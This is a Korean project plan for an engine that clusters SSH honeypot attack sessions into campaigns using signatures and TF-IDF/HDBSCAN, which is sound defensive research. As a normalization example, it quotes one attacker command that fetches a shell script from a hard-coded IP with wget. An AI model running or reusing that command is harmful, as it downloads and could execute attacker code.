# MVP 구현 계획 (SP2 구현 범위)

**프로젝트:** SSH 허니팟 공격 세션의 캠페인 단위 분석·분류 엔진
**팀:** 2인 (팀장: 보안 분석 / 팀원: 데이터·ML)
**작성일:** 2026-10-28

---

## 1. 개요

### 1.1 프로젝트 목표
SSH 허니팟(Cowrie)에 기록된 공격 세션을 **시그니처(알려진 공격 규칙)**와 **ML 군집화(명령어 n-gram TF-IDF + HDBSCAN)**로 분석하여, 같은 공격 도구·집단에서 나온 세션을 **'캠페인'** 단위로 묶는다. 각 캠페인은 통계, 대표 명령어, 공격 단계 시퀀스, MITRE ATT&CK 매핑을 담은 **캠페인 카드**로 정리한다.

본 시스템은 실시간 차단을 목적으로 하는 탐지 엔진이 아니라, 이미 수집된 공격을 이해하고 분류하는 **분석·분류 엔진**이다. 또한 허니팟 세션의 대부분은 사람이 아닌 스크립트에 의해 자동으로 수행되므로, 분석 대상은 **자동화된 공격 스크립트의 행동**으로 정의한다.

### 1.2 MVP 정의
MVP는 **"원본 로그를 넣으면 캠페인 목록과 성능 비교표가 나오는 전체 흐름이 끝까지 동작하는 최소 버전"**이다.

```
원본 로그 ─▶ ① 적재(DB) ─▶ ② 시그니처 매칭 ─▶ ③ 명령어 정규화
                                                    │
                       ┌────────────────────────────┴───────┐
                       ▼                                    ▼
               ④ 해시 베이스라인 군집              ⑤ TF-IDF + HDBSCAN 군집
                       └──────────────┬─────────────────────┘
                                      ▼
                  ⑦ 평가(정답 세트 ⑥ 기준) ─▶ 비교표
                                      ▼
                             ⑧ 캠페인 카드(기본형)
```

**핵심 검증 질문:** 단순 해시 방식보다 ML 군집화가 캠페인을 더 정확하게 묶는가?

## 3. MVP 구현 기능 목록

| ID | 기능 | 담당 | 우선순위 | 상태 |
|---|---|---|---|---|
| F1 | 로그 수집·적재 | 팀장 | 필수 | 완료 |
| F2 | 시그니처 매칭 (행동·캠페인) | 팀장 | 필수 | 완료 |
| F3 | 명령어 정규화 | 팀원 | 필수 | 예정 |
| F4 | 해시 베이스라인 군집화 | 팀원 | 필수 | 예정 |
| F5 | ML 군집화 (TF-IDF + HDBSCAN) | 팀원 | 필수 | 예정 |
| F6 | 정답 세트 구축 | 팀장 (공동 검증) | 필수 | 예정 |
| F7 | 평가 및 비교표 | 팀원 | 필수 | 예정 |
| F8 | 캠페인 카드 (기본형) | 공동 | 필수 | 예정 |

### F1. 로그 수집·적재 — 완료
- **내용:** Cowrie JSON 로그를 SQLite DB로 적재한다. 자체 허니팟 로그(JSON Lines)와 CyberLab 형식(세션별 묶음 배열)을 모두 처리한다.
- **입력:** 원본 로그 파일 (`raw/<sensor>/`)
- **출력:** `sessions`, `commands`, `failed_commands`, `downloads` 표
- **특징:** 원본 파일은 읽기만 함, 같은 파일 재적재 시 중복 없음, 팀원의 테스트 접속은 `excluded` 표시로 분석에서 제외

### F2. 시그니처 매칭 — 완료
- **내용:** 알려진 공격 규칙을 YAML 파일로 관리하고 모든 세션에 적용한다.
  - **행동 시그니처 (13개):** 공격 단계를 식별한다. 예: 시스템 정찰(T1082), 비밀번호 변경(T1098), SSH 키 심기(T1098.004), 로그 삭제(T1070.002), 파일 다운로드(T1105), 난독화 해제(T1140)
  - **캠페인 시그니처 (5개):** 특정 공격 도구 고유의 흔적을 식별한다. 예: `dota` 채굴 봇넷, 로그 삭제 키트, Perl 봇
- **출력:** `signature_hits` 표 (세션별 걸린 규칙, 처음 걸린 시각)
- **현재 결과:** 캠페인 시그니처가 전체의 97.4%를 설명하며, 나머지 2.6%(312개 세션)는 알려지지 않은 패턴으로 ML 군집화 결과와 비교한다.

### F3. 명령어 정규화
- **내용:** 같은 공격 스크립트라도 무작위 파일명, IP 주소, 암호화 문자열 때문에 매번 달라 보이는 문제를 해결한다. 가변 부분을 기호로 치환한다.
  - 예: `wget http://51.81.7.97/njs.sh` → `wget http://<IP>/njs.sh`
- **원칙:** 무작위 값은 지우되, 공격 집단을 구별하는 고유 이름(`dota`, `njs.sh` 등)은 보존한다.
- **근거:** 사전 분석에서 정규화 전 고유 명령어 시퀀스는 11,019개였으나, 간단한 정규화만으로 약 90개 유형으로 줄었다.
- **검증:** 대표 사례에 대한 단위 테스트 작성

### F4. 해시 베이스라인 군집화
- **내용:** 정규화된 명령어 시퀀스 전체가 완전히 같은 세션끼리 하나의 군집으로 묶는다.
- **목적:** ML 방식이 의미 있는지 판단하기 위한 비교 기준. 공정한 비교를 위해 F3과 **같은 정규화**를 적용한다.

### F5. ML 군집화 (TF-IDF + HDBSCAN)
- **내용:** 세션의 명령어를 n-gram 단위로 나누어 TF-IDF 벡터로 만든 뒤 HDBSCAN으로 군집화한다.
- **장점:** 명령어 일부가 추가·변경된 변형 스크립트도 같은 캠페인으로 묶을 수 있고, 군집 수를 미리 정하지 않아도 된다.
- **출력:** 세션별 군집 번호 (어느 군집에도 속하지 않는 세션은 노이즈로 표시)

### F6. 정답 세트 구축
- **내용:** 사람이 직접 200~300개 세션에 캠페인 라벨을 붙인다.
- **표본 추출:** 무작위 추출 시 특정 캠페인이 대부분을 차지하므로, **유형별 상한을 둔 층화 추출**을 사용한다.
- **품질 관리:** 라벨링 기준 문서를 먼저 작성하고, 50개 세션은 두 사람이 독립적으로 라벨링하여 일치도를 측정한다.

### F7. 평가 및 비교표
- **지표:** 쌍 단위 정밀도·재현율(같은 캠페인 세션 쌍을 맞게 묶었는가), ARI(Adjusted Rand Index)
- **규칙:** HDBSCAN의 노이즈 세션은 각각 단독 군집으로 취급한다.
- **산출물:** 해시 베이스라인 vs HDBSCAN 비교표 (11/9 마감)

### F8. 캠페인 카드 (기본형)
- **내용:** 군집별로 다음 정보를 정리한 카드를 생성한다.
  - 통계: 세션 수, 공격 IP 수, 기간, 국가 분포
  - 대표 명령어
  - 공격 단계 시퀀스: F2의 행동 시그니처를 시간 순서로 나열 (예: 정찰 → 다운로드 → 실행)
  - ATT&CK 기법 목록
- **형식:** MVP에서는 Markdown 문서로 출력한다.

### MVP 이후 확장 기능 (SP2 범위 제외)
| 기능 | 설명 |
|---|---|
| LLM 요약 | 캠페인 카드에 자연어 요약 추가 (무료 방식으로 구현) |
| Sigma 규칙 생성 | 캠페인별 탐지 규칙을 표준 Sigma 형식으로 출력 |
| 자체 수집 로그 적용 | 2026년 수집 데이터에서 신규 캠페인 분석 |
| 실시간 수집 | 서버 로그 자동 수집 (교수님 협의 후 결정) |
